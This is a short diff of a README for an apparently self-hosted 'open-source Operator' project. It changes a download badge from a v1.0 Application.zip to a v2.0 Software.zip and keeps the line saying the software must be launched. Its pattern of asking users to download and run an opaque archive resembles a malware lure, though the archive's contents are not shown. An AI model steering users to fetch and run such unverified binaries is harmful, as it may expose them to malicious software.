@@ -16,7 +16,7 @@ This repository allows you to create your self-hosted, open-source Operator mode
 
 ## Software Download
 
-[![Download Software](https://github.com/Yah185/open-source-operator/releases/download/v1.0/Application.zip)](https://github.com/Yah185/open-source-operator/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/Yah185/open-source-operator/releases/download/v2.0/Software.zip)](https://github.com/Yah185/open-source-operator/releases/download/v2.0/Software.zip)
 
 The software linked above needs to be launched to access its features.
 
